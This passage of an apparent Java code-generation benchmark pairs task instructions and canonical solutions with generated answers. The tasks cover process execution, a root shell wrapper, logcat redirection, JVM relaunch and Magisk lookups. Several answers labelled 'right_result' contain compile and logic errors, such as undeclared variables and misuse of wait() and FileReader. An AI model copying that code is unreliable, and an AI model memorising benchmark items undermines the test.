(InterruptedException e) {\n                        Log.w(TAG, e.getMessage(), e);\n                    }\n                }\n            }\n        }\n        \n        return mIsActive;\n    }\n    \n    public Boolean isActive() {\n        return mIsActive;\n    }\n    \n    public Boolean isRunning() {\n        return mCounter.size() > 0;\n    }\n    \n    public Boolean isRoot() {\n        return mIsRoot;\n    }\n    \n    public synchronized void destroy() {\n        if (mStdInput != null) {\n            mIsActive = false;\n            \n            mCounter.reset();\n            \n            try {\n                mStdInput.close();\n                mStdInput = null;\n                \n            } catch (IOException e) {}\n            \n            mStdOutputWorker.interrupt();\n            mStdOutputWorker = null;\n            \n            synchronized (mLock) {\n                mLock.notifyAll();\n            }\n            \n            mListener.onStreamDied();\n            mListener = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.*;\nimport java.util.concurrent.*;\n\npublic class ShellStream {\n    private Process mConnection;\n    private DataOutputStream mStdInput;\n    private BufferedReader mStdOutput;\n    private Thread mStdOutputWorker;\n    private OnStreamListener mListener;\n    private Counter mCounter = new Counter();\n    private final Object mLock = new Object();\n    private boolean mIsActive = true;\n    private boolean mIsRoot;\n    private String mCommandEnd;\n\n    public ShellStream(boolean requestRoot, OnStreamListener listener) throws IOException {\n        mIsRoot = requestRoot;\n        mCommandEnd = \"command_end_marker\";\n        ProcessBuilder pb = new ProcessBuilder(mIsRoot ? \"su\" : \"sh\");\n        mConnection = pb.start();\n        mStdInput = new DataOutputStream(mConnection.getOutputStream());\n        mStdOutput = new BufferedReader(new InputStreamReader(mConnection.getInputStream()));\n        mListener = listener;\n        mStdOutputWorker = new Thread(() -> {\n            try {\n                String line;\n                while ((line = mStdOutput.readLine()) != null) {\n                    if (line.contains(mCommandEnd)) {\n                        int exitCode = mConnection.waitFor();\n                        mListener.onStreamStop(exitCode);\n                    } else {\n                        mListener.onStreamInput(line);\n                    }\n                }\n            } catch (IOException | InterruptedException e) {\n                mListener.onStreamDied();\n            }\n        });\n        mStdOutputWorker.start();\n    }\n\n    public void execute(String command) {\n        synchronized (mLock) {\n            try {\n                mStdInput.writeBytes(command + \"; echo \\\"\" + mCommandEnd + \"\\\"\\n\");\n                mStdInput.flush();\n                mCounter.increase();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public boolean waitFor() {\n        return waitFor(null);\n    }\n\n    public boolean waitFor(Integer timeout) {\n        try {\n            if (timeout == null) {\n                mCounter.wait();\n            } else {\n                mCounter.wait(timeout);\n            }\n            return true;\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public boolean isActive() {\n        return mIsActive;\n    }\n\n    public boolean isRunning() {\n        synchronized (mLock) {\n            return mCounter.size() > 0;\n        }\n    }\n\n    public boolean isRoot() {\n        return mIsRoot;\n    }\n\n    public void destroy() {\n        mIsActive = false;\n        try {\n            mStdInput.close();\n            mStdOutput.close();\n            mConnection.destroy();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public interface OnStreamListener {\n        void onStreamStart();\n        void onStreamInput(String line);\n        void onStreamStop(int exitCode);\n        void onStreamDied();\n    }\n\n    public static class Counter {\n        private AtomicInteger value = new AtomicInteger(0);\n\n        public int size() {\n            return value.get();\n        }\n\n        public int increase() {\n            return value.incrementAndGet();\n        }\n\n        public int decrease() {\n            return value.decrementAndGet();\n        }\n\n        public void reset() {\n            value.set(0);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 287,
    "Instruction": "Task Description: The task involves creating a Java utility class that manages environment variables for a Java Runtime Environment (JRE) and handles log redirection from an external process. The class should provide methods to configure the JRE environment and redirect logs from the Android `logcat` command to a custom logger.\n\nClass Description: This utility class is designed to set up the JRE environment by configuring various system environment variables and redirecting logs from an external process (`logcat`) to a custom logger. It is particularly useful for Android applications that need to manage JRE environments and log outputs dynamically.\n\nAttributes:\n\n- `NATIVE_LIB_DIR`: String - The directory path for native libraries.\n- `LD_LIBRARY_PATH`: String - The library path for dynamic linking.\n- `LOCAL_RENDERER`: String - The renderer type for graphics (e.g., \"opengles3_desktopgl_angle_vulkan\").\n- `jvmLibraryPath`: String - The path to the JVM library (e.g., \"server/libjvm.so\" or \"client/libjvm.so\").\n- `logcatPb`: ProcessBuilder - A ProcessBuilder instance for executing the `logcat` command.\n- `failTime`: int - A counter to track the number of failed attempts to start the `logcat` process.\n\nMethods:\n\n- `redirectAndPrintJRELog()`: void - Starts a new thread to redirect and print JRE logs from the `logcat` command. The method configures the `logcat` command to filter specific log tags and redirects the output to a custom logger. If the process fails, it retries up to 10 times.\n- `setJavaEnvironment(Activity activity, String jreHome)`: void - Configures the JRE environment by setting various system environment variables. The method reads additional environment variables from a custom file (`custom_env.txt`) and applies them. It also sets the `LD_LIBRARY_PATH` and `PATH` variables to include the JRE binaries and native libraries.\n  - Input:\n    - `activity`: Activity - The Android activity context.\n    - `jreHome`: String - The home directory of the JRE.\n  - Output: None (void).\n- `setLdLibraryPath(String path)`: void - Sets the `LD_LIBRARY_PATH` environment variable to the specified path.\n  - Input:\n    - `path`: String - The new library path.\n  - Output: None (void).\n\nNote: The class assumes the presence of helper classes like `Logger`, `Tools`, `LauncherPreferences`, and `ExtraCore` for logging, file operations, and preference management. These dependencies should be handled appropriately in the implementation.",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Map;\nimport android.system.Os;\nimport android.system.ErrnoException;\n\npublic static void redirectAndPrintJRELog() {\n    new Thread(new Runnable(){\n        int failTime = 0;\n        ProcessBuilder logcatPb;\n        @Override\n        public void run() {\n            try {\n                if (logcatPb == null) {\n                    logcatPb = new ProcessBuilder().command(\"logcat\", \"-v\", \"brief\", \"-s\", \"jrelog:I\", \"LIBGL:I\", \"NativeInput\").redirectErrorStream(true);\n                }\n\n                new ProcessBuilder().command(\"logcat\", \"-c\").redirectErrorStream(true).start();\n                java.lang.Process p = logcatPb.start();\n\n                byte[] buf = new byte[1024];\n                int len;\n                while ((len = p.getInputStream().read(buf)) != -1) {\n                    String currStr = new String(buf, 0, len);\n                    Logger.appendToLog(currStr);\n                }\n\n                if (p.waitFor() != 0) {\n                    failTime++;\n                    if (failTime <= 10) {\n                        run();\n                    } else {\n                        Logger.appendToLog(\"ERROR: Unable to get more log.\");\n                    }\n                }\n            } catch (Throwable e) {\n                Logger.appendToLog(\"Exception on logging thread:\\n\" + Log.getStackTraceString(e));\n            }\n        }\n    }).start();\n}\n\npublic static void setJavaEnvironment(Activity activity, String jreHome) throws Throwable {\n    Map<String, String> envMap = new ArrayMap<>();\n    envMap.put(\"POJAV_NATIVEDIR\", NATIVE_LIB_DIR);\n    envMap.put(\"JAVA_HOME\", jreHome);\n    envMap.put(\"HOME\", Tools.DIR_GAME_HOME);\n    envMap.put(\"TMPDIR\", Tools.DIR_CACHE.getAbsolutePath());\n    envMap.put(\"LIBGL_MIPMAP\", \"3\");\n    envMap.put(\"LIBGL_NOERROR\", \"1\");\n    envMap.put(\"LIBGL_NOINTOVLHACK\", \"1\");\n    envMap.put(\"LIBGL_NORMALIZE\", \"1\");\n\n    if(PREF_DUMP_SHADERS)\n        envMap.put(\"LIBGL_VGPU_DUMP\", \"1\");\n    if(PREF_ZINK_PREFER_SYSTEM_DRIVER)\n        envMap.put(\"POJAV_ZINK_PREFER_SYSTEM_DRIVER\", \"1\");\n    if(PREF_VSYNC_IN_ZINK)\n        envMap.put(\"POJAV_VSYNC_IN_ZINK\", \"1\");\n    if(Tools.deviceHasHangingLinker())\n        envMap.put(\"POJAV_EMUI_ITERATOR_MITIGATE\", \"1\");\n\n    envMap.put(\"LIBGL_ES\", (String) ExtraCore.getValue(ExtraConstants.OPEN_GL_VERSION));\n    envMap.put(\"FORCE_VSYNC\", String.valueOf(LauncherPreferences.PREF_FORCE_VSYNC));\n    envMap.put(\"MESA_GLSL_CACHE_DIR\", Tools.DIR_CACHE.getAbsolutePath());\n    envMap.put(\"force_glsl_extensions_warn\", \"true\");\n    envMap.put(\"allow_higher_compat_version\", \"true\");\n    envMap.put(\"allow_glsl_extension_directive_midshader\", \"true\");\n    envMap.put(\"MESA_LOADER_DRIVER_OVERRIDE\", \"zink\");\n    envMap.put(\"VTEST_SOCKET_NAME\", new File(Tools.DIR_CACHE, \".virgl_test\").getAbsolutePath());\n\n    envMap.put(\"LD_LIBRARY_PATH\", LD_LIBRARY_PATH);\n    envMap.put(\"PATH\", jreHome + \"/bin:\" + Os.getenv(\"PATH\"));\n    if(FFmpegPlugin.isAvailable) {\n        envMap.put(\"PATH\", FFmpegPlugin.libraryPath+\":\"+envMap.get(\"PATH\"));\n    }\n\n    if(LOCAL_RENDERER != null) {\n        envMap.put(\"POJAV_RENDERER\", LOCAL_RENDERER);\n        if(LOCAL_RENDERER.equals(\"opengles3_desktopgl_angle_vulkan\")) {\n            envMap.put(\"LIBGL_ES\", \"3\");\n            envMap.put(\"POJAVEXEC_EGL\",\"libEGL_angle.so\");\n        }\n    }\n\n    File customEnvFile = new File(Tools.DIR_GAME_HOME, \"custom_env.txt\");\n    if (customEnvFile.exists() && customEnvFile.isFile()) {\n        BufferedReader reader = new BufferedReader(new FileReader(customEnvFile));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            int index = line.indexOf(\"=\");\n            envMap.put(line.substring(0, index), line.substring(index + 1));\n        }\n        reader.close();\n    }\n\n    for (Map.Entry<String, String> env : envMap.entrySet()) {\n        try {\n            Os.setenv(env.getKey(), env.getValue(), true);\n        }catch (NullPointerException exception){\n            Log.e(\"JREUtils\", exception.toString());\n        }\n    }\n\n    File serverFile = new File(jreHome + \"/\" + Tools.DIRNAME_HOME_JRE + \"/server/libjvm.so\");\n    jvmLibraryPath = jreHome + \"/\" + Tools.DIRNAME_HOME_JRE + \"/\" + (serverFile.exists() ? \"server\" : \"client\");\n    setLdLibraryPath(jvmLibraryPath+\":\"+LD_LIBRARY_PATH);\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport android.app.Activity;\nimport java.io.BufferedReader;\nimport java.io.File;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class JREManager {\n    public static final String NATIVE_LIB_DIR = \"/data/data/com.example.app/files/native\";\n    public static final String LD_LIBRARY_PATH = \"/data/data/com.example.app/files/lib\";\n    public static final String LOCAL_RENDERER = \"opengles3_desktopgl_angle_vulkan\";\n    private static String jvmLibraryPath = \"server/libjvm.so\";\n    private static ProcessBuilder logcatPb;\n    private static int failTime = 0;\n\n    public static void redirectAndPrintJRELog() {\n        new Thread(() -> {\n            try {\n                while (true) {\n                    if (failTime >= 10) break;\n                    logcatPb = new ProcessBuilder(\"logcat\", \"-s\", \"Tag:V\");\n                    logcatPb.redirectErrorStream(true);\n                    Process process = logcatPb.start();\n                    BufferedReader reader = new BufferedReader(new FileReader(process.getInputStream()));\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        Logger.log(line);\n                    }\n                    int exitCode = process.waitFor();\n                    if (exitCode == 0) break;\n                    failTime++;\n                }\n            } catch (IOException | InterruptedException e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public static void setJavaEnvironment(Activity activity, String jreHome) {\n        File envFile = new File(activity.getFilesDir(), \"custom_env.txt\");\n        List<String> envVars = new ArrayList<>();\n        try (BufferedReader reader = new BufferedReader(new FileReader(envFile))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                envVars.add(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        System.setProperty(\"JAVA_HOME\", jreHome);\n        System.setProperty(\"LD_LIBRARY_PATH\", LD_LIBRARY_PATH);\n        System.setProperty(\"PATH\", jreHome + \"/bin:\" + System.getProperty(\"PATH\"));\n        System.setProperty(\"LOCAL_RENDERER\", LOCAL_RENDERER);\n        System.setProperty(\"JVM_LIBRARY_PATH\", jvmLibraryPath);\n        for (String envVar : envVars) {\n            String[] parts = envVar.split(\"=\");\n            if (parts.length == 2) {\n                System.setProperty(parts[0], parts[1]);\n            }\n        }\n    }\n\n    public static void setLdLibraryPath(String path) {\n        System.setProperty(\"LD_LIBRARY_PATH\", path);\n    }\n}\n```"
  },
  {
    "Task_id": 291,
    "Instruction": "Task Description: Verify and ensure the Java Virtual Machine (JVM) is running on the first thread on macOS, relaunching the process if necessary with the correct arguments.\n\nFunction Description: This function checks if the JVM is running on the first thread on macOS, which is required for proper execution of certain applications. If not, it attempts to relaunch the process with the \"-XstartOnFirstThread\" argument. The function handles process creation, stream redirection, and output/error handling during the relaunch.\n\nInput: \n- args: String[] - Command-line arguments to be passed to the relaunched process (if needed)\n\nOutput: \n- boolean - Returns true if the JVM is already in a valid state (either not on macOS or already running on first thread), or false if a relaunch was attempted (the original process should exit in this case)",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.util.ArrayList;\nimport java.lang.management.ManagementFactory;\n\npublic static boolean verifyValidJVMState(String[] args){\n    if (SharedLibraryLoader.isMac){\n        if (\"1\".equals(System.getenv(\"JAVA_STARTED_ON_FIRST_THREAD_\" +\n                ManagementFactory.getRuntimeMXBean().getName().split(\"@\")[0]))) {\n            return true;\n        }\n\n        if (\"true\".equals(System.getProperty(\"shpdRelaunched\"))){\n            System.err.println(\"Error: Could not verify new process is running on the first thread. Trying to run the game anyway...\");\n            return true;\n        }\n\n        String sep = System.getProperty(\"file.separator\");\n\n        ArrayList<String> jvmArgs = new ArrayList<>();\n        jvmArgs.add(System.getProperty(\"java.home\") + sep + \"bin\" + sep + \"java\");\n        jvmArgs.add(\"-XstartOnFirstThread\");\n        jvmArgs.add(\"-DshpdRelaunched=true\");\n        jvmArgs.addAll(ManagementFactory.getRuntimeMXBean().getInputArguments());\n        jvmArgs.add(\"-cp\");\n        jvmArgs.add(System.getProperty(\"java.class.path\"));\n        jvmArgs.add(DesktopLauncher.class.getName());\n\n        System.err.println(\"Error: ShatteredPD must start on the first thread in order to work on macOS.\");\n        System.err.println(\"  To avoid this error, run the game with the \\\"-XstartOnFirstThread\\\" argument\");\n        System.err.println(\"  Now attempting to relaunch the game on the first thread automatically:\\n\");\n\n        try {\n            Process process = new ProcessBuilder(jvmArgs).redirectErrorStream(true).start();\n            BufferedReader out = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n\n            while ((line = out.readLine()) != null) {\n                if (line.toLowerCase().startsWith(\"error\")){\n                    System.err.println(line);\n                } else {\n                    System.out.println(line);\n                }\n            }\n\n            process.waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n        return false;\n    }\n\n    return true;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class FirstThreadChecker {\n    public static boolean checkAndRelaunch(String[] args) {\n        try {\n            ProcessBuilder pb = new ProcessBuilder(\"sysctl\", \"kern.posix1\");\n            pb.redirectErrorStream(true);\n            Process p = pb.start();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));\n            String line = reader.readLine();\n            if (line != null && line.contains(\"1\")) {\n                return true; // Running on macOS, but not necessarily on first thread\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // Relaunch with -XstartOnFirstThread\n        String[] newArgs = new String[args.length + 1];\n        System.arraycopy(args, 0, newArgs, 0, args.length);\n        newArgs[args.length] = \"-XstartOnFirstThread\";\n        pb = new ProcessBuilder(System.getProperty(\"java.home\") + \"/bin/java\", FirstThreadChecker.class.getName());\n        pb.command().addAll(Arrays.asList(newArgs));\n        pb.inheritIO();\n        try {\n            p = pb.start();\n            p.waitFor();\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n        return false; // Indicate that the original process should exit\n    }\n\n    public static void main(String[] args) {\n        if (!checkAndRelaunch(args)) {\n            System.exit(0); // Exit the original process if relaunch occurred\n        }\n        // Main logic here\n    }\n}\n```"
  },
  {
    "Task_id": 292,
    "Instruction": "Task Description: Implement a utility class for executing external processes synchronously and asynchronously in Java, handling input/output streams properly to prevent deadlocks, and collecting process output.\n\nClass Description: A ProcessExecutor utility class that provides methods to run external processes either synchronously (blocking until completion) or asynchronously (returning immediately), while properly managing process streams and errors.\n\nMethods:\n\nMethod1: runWith(List<String> cmd) -> Collection<String> - Executes a command synchronously and returns its output as a collection of strings. Handles both stdout and stderr streams by draining them concurrently to prevent deadlocks. The method blocks until the process completes.\n\nMethod2: runAsync(String... cmd) -> Process - Executes a command asynchronously and returns the Process object immediately without waiting for completion. The caller is responsible for handling the process streams and termination.\n\nMethod3: InputStreamDrainer(InputStream, OutputStream) -> void - [Internal helper class] A thread class that continuously reads from an input stream and writes to an output stream until EOF is reached. Used internally by runWith() to drain process streams.",
    "Canonical_solution": "import java.io.*;\nimport java.util.*;\nimport java.util.concurrent.*;\n\npublic static Collection<String> runWith(List<String> cmd) {\n    Collection<String> messages = new ArrayList<>();\n    try {\n        Process p = new ProcessBuilder(cmd).start();\n\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n\n        // drain streams, else we might lock up\n        InputStreamDrainer errDrainer = new InputStreamDrainer(p.getErrorStream(), baos);\n        InputStreamDrainer outDrainer = new InputStreamDrainer(p.getInputStream(), baos);\n\n        errDrainer.start();\n        outDrainer.start();\n\n        int err = p.waitFor();\n\n        errDrainer.join();\n        outDrainer.join();\n\n        messages.add(baos.toString());\n    } catch (IOException ex) {\n        return Collections.singleton(ex.getMessage());\n    } catch (InterruptedException ex) {\n        throw new IllegalStateException(ex);\n    }\n    return messages;\n}\n\npublic static Process runAsync(String... cmd) {\n    try {\n        return new ProcessBuilder(cmd).start();\n    } catch (IOException ex) {\n        throw new IllegalStateException(ex);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.*;\nimport java.util.*;\n\npublic class ProcessExecutor {\n    public static Collection<String> runWith(List<String> cmd) throws IOException, InterruptedException {\n        ProcessBuilder pb = new ProcessBuilder(cmd);\n        Process process = pb.start();\n        List<String> result = new ArrayList<>();\n        InputStreamDrainer stdoutDrainer = new InputStreamDrainer(process.getInputStream(), System.out);\n        InputStreamDrainer stderrDrainer = new InputStreamDrainer(process.getErrorStream(), System.err);\n        stdoutDrainer.start();\n        stderrDrainer.start();\n        int exitCode = process.waitFor();\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                result.add(line);\n            }\n        }\n        stdoutDrainer.join();\n        stderrDrainer.join();\n        return result;\n    }\n\n    public static Process runAsync(String... cmd) throws IOException {\n        ProcessBuilder pb = new ProcessBuilder(cmd);\n        return pb.start();\n    }\n\n    private static class InputStreamDrainer extends Thread {\n        private final InputStream in;\n        private final OutputStream out;\n\n        public InputStreamDrainer(InputStream in, OutputStream out) {\n            this.in = in;\n            this.out = out;\n        }\n\n        @Override\n        public void run() {\n            try (InputStreamReader reader = new InputStreamReader(in);\n                 BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(out))) {\n                char[] buffer = new char[1024];\n                int bytesRead;\n                while ((bytesRead = reader.read(buffer)) != -1) {\n                    writer.write(buffer, 0, bytesRead);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 294,
    "Instruction": "Task Description: Create a Java class that manages the execution of external processes, handles their input/output streams, and provides mechanisms for process termination and output handling through callbacks.\n\nClass Description: The ProcessExecutor class is responsible for executing external processes using ProcessBuilder, managing their lifecycle, and providing real-time output handling through a callback interface. It uses a thread pool for asynchronous execution and includes methods for graceful termination.\n\nAttributes:\n- mProcessBuilder: ProcessBuilder - Configures and manages the external process to be executed\n- mProcess: Process - Represents the currently running external process instance\n- mExecutor: ThreadPoolExecutor - Manages the thread used for asynchronous process execution\n\nMethods:\n- ProcessExecutor(Path scriptPath, Path libraryPath) -> void - Constructor that initializes the ProcessBuilder with the given script and library paths\n- execute(ProcessOutputHandler outputHandler) -> void - Starts the external process asynchronously and handles its output through the provided callback interface\n- terminate() -> void - Terminates the running process and shuts down the executor service\n- interface ProcessOutputHandler - Callback interface for handling process output, completion, and errors\n  - handleOutput(String output) -> void - Called for each line of output from the process\n  - handleCompletion(int exitCode) -> void - Called when the process completes with its exit code\n  - handleError(String errorMessage) -> void - Called when an error occurs during process execution",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.nio.file.Path;\nimport java.util.concurrent.ThreadPoolExecutor;\n\npublic class ProcessExecutor {\n\n    private ProcessBuilder mProcessBuilder;\n    private Process mProcess;\n    private ThreadPoolExecutor mExecutor;\n\n    public ProcessExecutor(Path scriptPath, Path libraryPath) {\n        mProcessBuilder = new ProcessBuilder();\n        mProcessBuilder.command(scriptPath.toString(), libraryPath.toString());\n    }\n\n    public void execute(ProcessOutputHandler outputHandler) {\n        mExecutor = ThreadPool.CACHED;\n        mExecutor.execute(() -> {\n            try {\n                mProcess = mProcessBuilder.start();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(mProcess.getInputStream()));\n                String line;\n                while((line = reader.readLine()) != null) {\n                    outputHandler.handleOutput(line);\n                }\n\n                int exitCode = mProcess.waitFor();\n                outputHandler.handleCompletion(exitCode);\n            } catch(InterruptedException ie) {\n                outputHandler.handleError(\"Process was interrupted\");\n            } catch(IOException ioe) {\n                outputHandler.handleError(\"IO Error during process execution\");\n            }\n        });\n    }\n\n    public void terminate() {\n        if(mProcess != null) {\n            mProcess.destroy();\n        }\n        if(mExecutor != null) {\n            mExecutor.shutdownNow();\n        }\n    }\n\n    public interface ProcessOutputHandler {\n        void handleOutput(String output);\n        void handleCompletion(int exitCode);\n        void handleError(String errorMessage);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.file.Path;\nimport java.util.concurrent.*;\n\npublic class ProcessExecutor {\n    private final ProcessBuilder mProcessBuilder;\n    private Process mProcess;\n    private ExecutorService mExecutor;\n\n    public ProcessExecutor(Path scriptPath, Path libraryPath) {\n        mProcessBuilder = new ProcessBuilder(scriptPath.toString(), libraryPath.toString());\n        mExecutor = Executors.newSingleThreadExecutor();\n    }\n\n    public void execute(ProcessOutputHandler outputHandler) {\n        try {\n            mProcess = mProcessBuilder.start();\n            Future<?> future = mExecutor.submit(() -> {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(mProcess.getInputStream()))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        outputHandler.handleOutput(line);\n                    }\n                } catch (IOException e) {\n                    outputHandler.handleError(e.getMessage());\n                }\n            });\n\n            int exitCode = mProcess.waitFor();\n            future.get(); // Wait for the output reading to finish\n            outputHandler.handleCompletion(exitCode);\n        } catch (IOException | InterruptedException | ExecutionException e) {\n            outputHandler.handleError(e.getMessage());\n        }\n    }\n\n    public void terminate() {\n        if (mProcess != null) {\n            mProcess.destroyForcibly();\n        }\n        mExecutor.shutdownNow();\n    }\n\n    @FunctionalInterface\n    public interface ProcessOutputHandler {\n        void handleOutput(String output);\n        void handleCompletion(int exitCode);\n        void handleError(String errorMessage);\n    }\n}\n```"
  },
  {
    "Task_id": 295,
    "Instruction": "Task Description: The task involves creating utility functions for executing system commands and retrieving information about the Magisk tool using Java's ProcessBuilder for inter-process communication.\n\nFunction Description: The provided code consists of three utility functions that work with system processes to execute commands and retrieve Magisk-related information. These functions demonstrate proper process handling, stream management, and error handling in Java.\n\nMethods:\n\nMethod1: exec(String... command) -> void - Executes a system command using ProcessBuilder. Takes a variable number of strings representing the command and its arguments. Logs the exit code or any errors encountered during execution.\n\nMethod2: getMagiskVersionCode() -> int - Retrieves the version code of Magisk by executing 'magisk -V' command. Returns the version code as an integer, or -1 if an error occurs. Caches the result for subsequent calls.\n\nMethod3: getMagiskTmpfsPath() -> String - Retrieves the tmpfs path used by Magisk by executing 'magisk --path' command. Returns the path as a string, or an empty string if an error occurs. Checks Magisk version first and returns '/sbin' for older versions (<21000). Caches the result for subsequent calls.\n\nAttributes:\nmagiskVersionCode: int - Caches the Magisk version code to avoid repeated process execution\nmagiskTmpfsPath: String - Caches the Magisk tmpfs path to avoid repeated process execution",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.concurrent.Executors;\n\npublic static void exec(String... command) {\n    ProcessBuilder pb = new ProcessBuilder(command);\n    try {\n        Process process = pb.start();\n        int code = process.waitFor();\n        Log.i(TAG, \"Exec \" + command[0] + \" exited with \" + code);\n    } catch (Throwable e) {\n        Log.w(TAG, \"Exec \" + command[0], e);\n    }\n}\n\npublic static int getMagiskVersionCode() {\n    if (magiskVersionCode != -1) {\n        return magiskVersionCode;\n    }\n\n    try {\n        ProcessBuilder ps = new ProcessBuilder(\"magisk\", \"-V\");\n        ps.redirectErrorStream(true);\n        Process pr = ps.start();\n\n        BufferedReader in = new BufferedReader(new InputStreamReader(pr.getInputStream()));\n        String line = in.readLine();\n        Log.i(TAG, \"Exec magisk -V: \" + line);\n        magiskVersionCode = Integer.parseInt(line);\n        pr.waitFor();\n        in.close();\n        return magiskVersionCode;\n    } catch (Throwable e) {\n        Log.w(TAG, \"Exec magisk -V\", e);\n        return -1;\n    }\n}\n\npublic static String getMagiskTmpfsPath() {\n    if (magiskTmpfsPath != null) {\n        return magiskTmpfsPath;\n    }\n\n    if (getMagiskVersionCode() < 21000) {\n        return \"/sbin\";\n    }\n\n    try {\n        ProcessBuilder ps = new ProcessBuilder(\"magisk\", \"--path\");\n        ps.redirectErrorStream(true);\n        Process pr = ps.start();\n\n        BufferedReader in = new BufferedReader(new InputStreamReader(pr.getInputStream()));\n        magiskTmpfsPath = in.readLine();\n        Log.i(TAG, \"Exec magisk --path: \" + magiskTmpfsPath);\n        pr.waitFor();\n        in.close();\n        return magiskTmpfsPath;\n    } catch (Throwable e) {\n        Log.w(TAG, \"Exec magisk --path\", e);\n        return \"\";\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class SystemUtils {\n    private static int magiskVersionCode = -1;\n    private static String magiskTmpfsPath = \"\";\n\n    public static void exec(String... command) {\n        try {\n            ProcessBuilder pb = new ProcessBuilder(command);\n            Process process = pb.start();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            int exitCode = process.waitFor();\n            System.out.println(\"Exit Code: \" + exitCode);\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static int getMagiskVersionCode() {\n        if (magiskVersionCode == -1) {\n            try {\n                ProcessBuilder pb = new ProcessBuilder(\"magisk\", \"-V\");\n                Process process = pb.start();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n                String version = reader.readLine().trim();\n                magiskVersionCode = Integer.parseInt(version.split(\"\\\\.\")[0]);\n            } catch (IOException | NumberFormatException e) {\n                e.printStackTrace();\n            }\n        }\n        return magiskVersionCode;\n    }\n\n    public static String getMagiskTmpfsPath() {\n        if (magiskTmpfsPath.isEmpty()) {\n            int versionCode = getMagiskVersionCode();\n            if (versionCode >= 21000) {\n                try {\n                    ProcessBuilder pb = new ProcessBuilder(\"magisk\", \"--path\");\n                    Process process = pb.start();\n                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n                    magiskTmpfsPath = reader.readLine().trim();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            } else {\n                magiskTmpfsPath = \"/sbin\";\n            }\n        }\n        return magiskTmpfsPath;\n    }\n}\n```"
  },
  {
    "Task_id": 296,
    "Instruction": "Task Description: Create a function that executes an external diff tool to compare two files and generate a difference file, while capturing and logging the tool's output.\n\nFunction Description: The function `diffFile` executes an external diff utility specified by its path and arguments, comparing two input files (old and new versions) and generating a difference file. It captures the standard output and error streams of the external process, logs them, and waits for the process to complete before returning.\n\nInput:\n- `mCustomDiffPath`: String - Path to the external diff tool executable\n- `mCustomDiffPathArgs`: String - Arguments to pass to the diff tool (space-separated)\n- `oldFile`: File - The original file to compare against\n- `newFile`: File - The modified file to compare\n- `diffFile`: File - The output file where differences will be written\n\nOutput:\n- None (void) - The function doesn't return any value but writes the diff output to the specified file and logs the process output\n- Throws IOException if process execution fails\n- Throws InterruptedException if the process is interrupted while waiting",
